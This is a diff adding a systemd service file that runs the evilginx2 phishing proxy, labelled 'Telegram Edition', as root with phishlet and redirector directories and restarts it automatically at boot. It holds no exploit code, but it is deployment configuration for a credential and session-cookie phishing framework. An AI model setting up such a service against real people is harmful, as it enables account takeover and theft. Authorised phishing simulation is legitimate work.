@@ -1,0 +1,18 @@
+[Unit]
+Description=evilginx2 Telegram Edition
+After=network-online.target
+Wants=network-online.target
+
+[Service]
+Type=simple
+User=root
+WorkingDirectory=/root/evilginx2
+ExecStart=/root/evilginx2/evilginx2 -p /root/evilginx2/phishlets -t /root/evilginx2/redirectors
+Restart=on-failure
+RestartSec=5
+StandardInput=null
+StandardOutput=journal
+StandardError=journal
+
+[Install]
+WantedBy=multi-user.target
